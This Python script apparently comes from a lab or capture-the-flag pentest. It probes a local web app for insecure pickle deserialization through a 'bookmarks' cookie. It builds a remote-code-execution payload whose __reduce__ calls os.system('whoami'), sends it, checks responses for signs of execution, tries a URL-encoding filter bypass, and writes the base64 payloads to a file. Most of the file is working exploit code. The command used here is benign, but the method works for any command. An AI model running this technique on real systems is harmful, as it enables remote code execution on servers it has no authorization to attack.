import requests
import pickle
import base64
import sys
import os
import urllib.parse

base_url = "http://127.0.0.1:32821"

print("=" * 80)
print("PICKLE DESERIALIZATION TESTING - COOKIE ANALYSIS")
print("=" * 80)

# Test 1: Create a benign pickle payload to understand structure
print("\n[TEST 1] Creating benign pickle payload (list of strings)")
class TestObject:
    def __init__(self):
        self.data = ["test", "bookmark", "analysis"]
    
    def __reduce__(self):
        # Return a benign tuple that won't execute anything dangerous
        return (list, ())

benign_obj = TestObject()
benign_pickle = pickle.dumps(benign_obj)
benign_b64 = base64.b64encode(benign_pickle).decode('utf-8')
print(f"Benign pickle (Base64): {benign_b64[:50]}...")
print(f"Raw pickle (hex): {benign_pickle[:20].hex()}")

# Test 2: Send benign pickle via cookie to see if it's accepted
print("\n[TEST 2] Testing cookie-based deserialization")
session = requests.Session()
headers = {
    "User-Agent": "Deserialization-Test/1.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

cookies = {
    "bookmarks": benign_b64
}

try:
    response = session.get(base_url, headers=headers, cookies=cookies, timeout=10)
    print(f"Status Code: {response.status_code}")
    print(f"Response Length: {len(response.text)} bytes")
    print(f"Cookies: {dict(response.cookies)}")
    print(f"Set-Cookie Header: {response.headers.get('Set-Cookie', 'None')}")
    
    # Check if the bookmark appears in the page
    if "test" in response.text.lower():
        print("[+] SUCCESS: Benign bookmark data appears to be processed!")
    else:
        print("[-] INFO: Bookmark data not visible in response")
        
    # Check for error messages or stack traces
    if "error" in response.text.lower() or "exception" in response.text.lower():
        print("[!] WARNING: Error/exception detected in response (potential leak)")
        # Extract error snippet
        lines = response.text.split('\n')
        for i, line in enumerate(lines):
            if 'error' in line.lower() or 'exception' in line.lower():
                print(f"Error line {i}: {line.strip()}")
except Exception as e:
    print(f"[-] ERROR: {type(e).__name__}: {str(e)}")

# Test 3: Create malicious payload to test for RCE
print("\n[TEST 3] Creating malicious pickle payload (RCE test)")
class RCEObject:
    def __reduce__(self):
        # Execute a command that reveals code execution
        import os
        # Use a command that produces visible output without being dangerous
        return (os.system, ("whoami",))

rce_obj = RCEObject()
rce_pickle = pickle.dumps(rce_obj)
rce_b64 = base64.b64encode(rce_pickle).decode('utf-8')
print(f"Malicious pickle (Base64): {rce_b64[:50]}...")
print(f"Raw pickle (hex): {rce_pickle[:20].hex()}")

try:
    cookies = {"bookmarks": rce_b64}
    response = session.get(base_url, headers=headers, cookies=cookies, timeout=10)
    print(f"Status Code: {response.status_code}")
    print(f"Response Length: {len(response.text)} bytes")
    
    # Look for signs of command execution
    if response.status_code != 200:
        print(f"[!] ANOMALY: Status code changed to {response.status_code}")
    
    # Check for system output patterns
    suspicious_patterns = [
        "root", "uid", "gid", "/home/", "/var/", 
        "www-data", "apache", "nobody", "daemon"
    ]
    
    found_patterns = []
    for pattern in suspicious_patterns:
        if pattern.lower() in response.text.lower():
            found_patterns.append(pattern)
    
    if found_patterns:
        print(f"[!] POTENTIAL EXECUTION DETECTED: {found_patterns}")
        print("[!] Response snippet:")
        lines = response.text.split('\n')
        for line in lines[:20]:
            print(f"  {line[:100]}")
    else:
        print("[-] No obvious execution indicators found")
        
except Exception as e:
    print(f"[-] ERROR: {type(e).__name__}: {str(e)}")

# Test 4: Test with /add endpoint if it accepts bookmarks parameter
print("\n[TEST 4] Testing /add endpoint with pickle payload")
try:
    # Try to add bookmark with potentially malicious data
    data = {
        "bookmark": "test-bookmark",
        "payload": benign_b64  # This might get stored and deserialized later
    }
    
    response = session.post(
        f"{base_url}/add", 
        data=data, 
        headers=headers, 
        timeout=10
    )
    print(f"Status Code: {response.status_code}")
    print(f"Response Length: {len(response.text)} bytes")
    
    if response.status_code in [200, 302]:
        print("[+] Endpoint responds - checking if pickle is processed")
        
        # Try to access the page again to see if pickle cookie was set
        response2 = session.get(base_url, headers=headers, timeout=10)
        if "bookmarks" in dict(response2.cookies):
            print(f"[+] Cookie set: bookmarks={response2.cookies['bookmarks'][:50]}...")
        
        # Check if bookmark appears
        if "test" in response2.text.lower() or "bookmark" in response2.text.lower():
            print("[+] Data from pickle appears to be reflected")

except Exception as e:
    print(f"[-] ERROR: {type(e).__name__}: {str(e)}")

# Test 5: Create a payload that reveals pickle structure on deserialization
print("\n[TEST 5] Creating introspective pickle payload")
class IntrospectionObject:
    def __init__(self):
        self.secret = "introspection_test"
    
    def __reduce__(self):
        # This will help us understand what's available
        import builtins
        return (builtins.str, ("Pickle deserialized successfully",))

intro_obj = IntrospectionObject()
intro_pickle = pickle.dumps(intro_obj)
intro_b64 = base64.b64encode(intro_pickle).decode('utf-8')
print(f"Introspection pickle (Base64): {intro_b64[:50]}...")

try:
    cookies = {"bookmarks": intro_b64}
    response = session.get(base_url, headers=headers, cookies=cookies, timeout=10)
    print(f"Status Code: {response.status_code}")
    print(f"Response Length: {len(response.text)} bytes")
    
    # Look for the introspection string
    if "deserialized" in response.text.lower():
        print("[+] SUCCESS: Pickle structure is being processed!")
    
except Exception as e:
    print(f"[-] ERROR: {type(e).__name__}: {str(e)}")

# Test 6: URL-encoded base64 payload (common filter bypass)
print("\n[TEST 6] Testing URL-encoded base64 payload")
try:
    url_encoded_payload = urllib.parse.quote(benign_b64)
    cookies = {"bookmarks": url_encoded_payload}
    response = session.get(base_url, headers=headers, cookies=cookies, timeout=10)
    print(f"Status Code: {response.status_code}")
    print(f"Response Length: {len(response.text)} bytes")
    
    if response.status_code == 200:
        print("[-] Application appears to handle both raw and URL-encoded B64")
    
except Exception as e:
    print(f"[-] ERROR: {type(e).__name__}: {str(e)}")

# Summary
print("\n" + "=" * 80)
print("DESERIALIZATION TEST SUMMARY")
print("=" * 80)
print("Based on the tests above, we can determine:")
print("1. Whether the application accepts pickle data in cookies")
print("2. How it processes and deserializes the data")
print("3. If there's any sanitization or validation")
print("4. Whether RCE is possible via malicious pickle objects")
print("=" * 80)

# Save payloads to file for manual testing if needed
print("\n[+] Saving test payloads to file for reference...")
with open('/tmp/pickle_payloads.txt', 'w') as f:
    f.write("=== PICKLE DESERIALIZATION TEST PAYLOADS ===\n\n")
    f.write(f"Benign payload: {benign_b64}\n")
    f.write(f"Malicious RCE payload: {rce_b64}\n")
    f.write(f"Introspection payload: {intro_b64}\n")
    f.write(f"URL-encoded benign: {urllib.parse.quote(benign_b64)}\n")

print("[+] Payloads saved to /tmp/pickle_payloads.txt")
